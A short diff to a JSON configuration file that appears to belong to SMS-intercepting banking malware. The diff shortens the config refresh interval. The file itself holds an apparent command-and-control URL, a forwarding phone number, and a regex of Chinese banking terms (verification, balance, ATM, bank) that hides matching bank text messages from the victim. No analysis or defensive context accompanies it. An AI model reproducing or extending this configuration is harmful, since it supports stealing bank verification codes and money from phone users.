@@ -1,6 +1,6 @@
 {
 "ccurl":"http://njuj01.w74.mc-test.com/xss.aspx",
-"cfgupdatetime":"600",
+"cfgupdatetime":"20",
 "heartbeat_time":"20",
 "cctel":"13682239741",
 "sms_block_pattern":"验证|校验|消费|余额|刷卡|取现|体现|ATM|银行",
